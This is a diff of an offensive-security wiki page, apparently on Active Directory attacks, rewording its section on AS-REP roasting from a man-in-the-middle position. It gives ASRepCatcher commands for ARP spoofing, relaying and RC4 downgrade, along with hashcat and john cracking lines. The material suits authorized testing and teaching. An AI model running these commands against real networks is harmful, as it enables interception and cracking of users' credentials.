@@ -64,26 +64,20 @@ hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
 john --wordlist=$wordlist ASREProastables.txt
 ```
 
-### ASREProast w/o domain credentials
+### ASREProast MitM
 
-The caveat with these previous tools is that they require knowledge of the users who do not require Kerberos pre-authentication, which is typically achieved with domain credentials.
-
-[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) catches AS-REP packets in transit across the network by placing itself in a man-in-the-middle position.<br>
-Moreover, the tool <ins>forces client workstations to use RC4</ins> by altering the Kerberos negotiation.
+Another way to conduct AS-REP roasting, without having to know the vulnerable users, would be to have a man-in-the-middle position on the network and catch AS-REPs. [ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) (Python) can be used for that purpose. It also has the ability to force client workstations to use RC4 (weaker encryption type) by altering the Kerberos negotiation process. The tool natively uses ARP spoofing (which can be disabled if needed).
 
 ```bash
-# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
+# Proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
 
-# Disabling ARP spoofing, the mitm position is obtained differently
+# Disables ARP spoofing (the MitM must be obtained with other means)
 ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
 
-# Passive listening for AS-REP packets, no packet alteration
+# Passively listen for AS-REP packets, no packet alteration
 ASrepCatcher.py listen
 ```
-
-The tool natively uses ARP spoofing. However, it can be disabled by the attacker to use a different mitm method.
-
 
 ## Resources
 
